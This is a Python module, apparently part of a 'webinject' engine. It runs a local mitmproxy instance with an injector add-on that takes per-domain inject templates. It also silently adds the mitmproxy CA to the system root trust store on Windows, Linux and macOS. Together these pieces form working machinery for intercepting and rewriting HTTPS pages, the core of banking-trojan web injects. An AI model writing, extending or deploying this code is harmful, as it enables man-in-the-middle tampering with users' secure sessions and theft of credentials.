# Webinject Engine - MITM Proxy Controller

import logging
import threading
import asyncio
import os
import platform
import subprocess
import shutil
from typing import Optional, List, Dict

from mitmproxy import options
from mitmproxy import master
from mitmproxy.tools.dump import DumpMaster
from mitmproxy.addons import default_addons
from mitmproxy.certs import CertStore

from .addons.injector import InjectorAddon # Импортируем наш аддон
from .interface import WebinjectInterface

logger = logging.getLogger('MitmProxyController')

# Путь к директории сертификатов mitmproxy по умолчанию
MITMPROXY_CERT_DIR = os.path.expanduser("~/.mitmproxy")
MITMPROXY_CA_CERT_PEM = os.path.join(MITMPROXY_CERT_DIR, "mitmproxy-ca-cert.pem")
MITMPROXY_CA_CERT_CRT = os.path.join(MITMPROXY_CERT_DIR, "mitmproxy-ca-cert.crt") # Для Debian/Ubuntu

class MitmProxy(WebinjectInterface):

    def __init__(self, config: Optional[Dict] = None):
        self.config = config if config else {}
        self.mitm_master: Optional[master.Master] = None
        self.mitm_thread: Optional[threading.Thread] = None
        self.injector_addon = InjectorAddon() # Создаем экземпляр нашего аддона
        self.running = False
        self.loop = None # Для запуска/остановки asyncio event loop
        # Генерируем сертификаты при инициализации, если их нет
        self._ensure_ca_exists()

    def _ensure_ca_exists(self):
        """Проверяет наличие CA сертификата и генерирует его при необходимости."""
        if not os.path.exists(MITMPROXY_CA_CERT_PEM):
             logger.info(f"mitmproxy CA certificate not found at {MITMPROXY_CA_CERT_PEM}. Generating...")
             try:
                 # Создаем объект CertStore, он сам сгенерирует CA при необходимости
                 CertStore.default_store(MITMPROXY_CERT_DIR)
                 logger.info(f"mitmproxy CA certificate generated in {MITMPROXY_CERT_DIR}")
             except Exception as e:
                  logger.error(f"Failed to generate mitmproxy CA certificate: {e}", exc_info=True)
                  # Дальнейшая работа с HTTPS будет невозможна
        else:
            logger.debug("mitmproxy CA certificate already exists.")
        # Создаем .crt версию для Debian/Ubuntu
        if os.path.exists(MITMPROXY_CA_CERT_PEM) and not os.path.exists(MITMPROXY_CA_CERT_CRT):
             try:
                 shutil.copy2(MITMPROXY_CA_CERT_PEM, MITMPROXY_CA_CERT_CRT)
                 logger.debug(f"Copied PEM certificate to CRT: {MITMPROXY_CA_CERT_CRT}")
             except Exception as e:
                  logger.error(f"Failed to copy CA PEM to CRT: {e}")

    def start_proxy(self, port: int = 8080, target_domains: Optional[list[str]] = None):
        if self.running:
            logger.warning("MITM proxy is already running.")
            return

        logger.info(f"Starting MITM proxy on port {port}...")
        opts = options.Options(listen_host='127.0.0.1', listen_port=port)
        # Отключаем встроенный веб-интерфейс и консоль
        opts.web_open_browser = False
        opts.termlog_verbosity = 'error' # Меньше логов от mitmproxy
        opts.console_eventlog_verbosity = 'error'

        # Используем DumpMaster, так как нам не нужен интерактивный интерфейс
        self.mitm_master = DumpMaster(opts)

        # Добавляем наш аддон и аддоны по умолчанию
        self.mitm_master.addons.add(*default_addons())
        self.mitm_master.addons.add(self.injector_addon)

        # Устанавливаем целевые домены в аддон (если есть)
        if target_domains:
             self.injector_addon.set_target_domains(target_domains)

        # Запускаем mitmproxy master в отдельном потоке с новым event loop
        def run_mitm():
            self.loop = asyncio.new_event_loop()
            asyncio.set_event_loop(self.loop)
            try:
                 self.mitm_master.run()
            except KeyboardInterrupt:
                 logger.info("MITM proxy interrupted by KeyboardInterrupt (likely shutdown)." )
            except Exception as e:
                 if self.running: # Логируем, только если не штатная остановка
                     logger.error(f"MITM proxy main loop error: {e}", exc_info=True)
            finally:
                 logger.info("MITM proxy loop finished.")
                 if self.loop and not self.loop.is_closed():
                      self.loop.close()
                 self.loop = None

        self.mitm_thread = threading.Thread(target=run_mitm, daemon=True, name="MitmProxyThread")
        self.running = True
        self.mitm_thread.start()
        logger.info(f"MITM proxy started on 127.0.0.1:{port}.")

    def stop_proxy(self):
        if not self.running or not self.mitm_master:
            logger.info("MITM proxy is not running.")
            return

        logger.info("Stopping MITM proxy...")
        self.running = False
        # Вызываем shutdown из потока event loop, если он есть
        if self.loop and self.loop.is_running():
             self.loop.call_soon_threadsafe(self.mitm_master.shutdown)
        elif self.mitm_master:
             # Если loop не запущен, пытаемся остановить напрямую (может вызвать проблемы)
             try:
                 self.mitm_master.shutdown()
             except Exception as e:
                  logger.warning(f"Exception during direct shutdown: {e}")

        # Ожидаем завершения потока
        if self.mitm_thread and self.mitm_thread.is_alive():
            self.mitm_thread.join(timeout=10)
            if self.mitm_thread.is_alive():
                 logger.warning("MITM proxy thread did not stop gracefully.")

        self.mitm_master = None
        self.mitm_thread = None
        logger.info("MITM proxy stopped.")

    def update_injects(self, inject_templates: Dict[str, str]):
        self.injector_addon.update_injects(inject_templates)
        logger.info(f"Updated {len(inject_templates)} inject templates.")

    def install_ca_certificate(self) -> bool:
        ca_path_pem = MITMPROXY_CA_CERT_PEM
        ca_path_crt = MITMPROXY_CA_CERT_CRT
        system = platform.system().lower()
        command: List[str] = []
        success_msg = ""
        error_msg = ""

        if not os.path.exists(ca_path_pem):
            logger.error(f"Cannot install CA certificate: PEM file not found at {ca_path_pem}. Ensure it was generated.")
            return False

        logger.info(f"Attempting to install CA certificate for {system}...")

        try:
            if system == "windows":
                # Используем certutil, он должен быть в PATH
                command = ["certutil", "-addstore", "-f", "ROOT", ca_path_pem]
                success_msg = "Windows CA certificate installation command executed. Please verify in certlm.msc."
            elif system == "linux":
                # Проверяем наличие update-ca-certificates и update-ca-trust
                if shutil.which("update-ca-certificates") is not None:
                    # Debian/Ubuntu
                    if not os.path.exists(ca_path_crt):
                        error_msg = f"CRT certificate file not found for Debian/Ubuntu: {ca_path_crt}"
                    else:
                         target_path = "/usr/local/share/ca-certificates/mitmproxy-ca-cert.crt"
                         # Копируем с sudo
                         copy_cmd = ["sudo", "cp", ca_path_crt, target_path]
                         logger.debug(f"Executing: {' '.join(copy_cmd)}")
                         cp_result = subprocess.run(copy_cmd, capture_output=True, text=True, check=False)
                         if cp_result.returncode != 0:
                              error_msg = f"Failed to copy certificate (requires sudo): {cp_result.stderr}"
                         else:
                             logger.info(f"Copied certificate to {target_path}")
                             command = ["sudo", "update-ca-certificates"]
                             success_msg = "Debian/Ubuntu CA certificate update command executed."
                elif shutil.which("update-ca-trust") is not None:
                     # Fedora/CentOS/RHEL
                     target_path = "/etc/pki/ca-trust/source/anchors/mitmproxy-ca-cert.pem"
                     # Копируем с sudo
                     copy_cmd = ["sudo", "cp", ca_path_pem, target_path]
                     logger.debug(f"Executing: {' '.join(copy_cmd)}")
                     cp_result = subprocess.run(copy_cmd, capture_output=True, text=True, check=False)
                     if cp_result.returncode != 0:
                          error_msg = f"Failed to copy certificate (requires sudo): {cp_result.stderr}"
                     else:
                         logger.info(f"Copied certificate to {target_path}")
                         command = ["sudo", "update-ca-trust", "extract"]
                         success_msg = "Fedora/CentOS CA certificate update command executed."
                else:
                     error_msg = "Could not find 'update-ca-certificates' or 'update-ca-trust'. Cannot install CA on this Linux distribution automatically."
            elif system == "darwin": # macOS
                 command = ["sudo", "security", "add-trusted-cert", "-d", "-r", "trustRoot", "-k", "/Library/Keychains/System.keychain", ca_path_pem]
                 success_msg = "macOS CA certificate installation command executed. Please verify in Keychain Access."
            else:
                 error_msg = f"Unsupported operating system for automatic CA installation: {system}"

            # Если команда сформирована и не было ошибки копирования
            if command and not error_msg:
                logger.debug(f"Executing: {' '.join(command)}")
                result = subprocess.run(command, capture_output=True, text=True, check=False)

                if result.returncode == 0:
                    logger.info(success_msg)
                    return True
                else:
                    error_msg = f"Command failed (requires sudo/admin privileges?): {result.stderr or result.stdout}"
                    logger.error(error_msg)
                    return False
            elif error_msg:
                 logger.error(error_msg)
                 return False
            else:
                 # Не должно происходить, но на всякий случай
                 logger.error("Failed to determine installation command.")
                 return False

        except FileNotFoundError as e:
             logger.error(f"Command not found: {e.filename}. Is the required tool (certutil, update-ca-..., security) installed and in PATH?", exc_info=True)
             return False
        except Exception as e:
             logger.error(f"Unexpected error during CA installation: {e}", exc_info=True)
             return False

    def __del__(self):
        # Гарантированная остановка при удалении объекта
        self.stop_proxy() 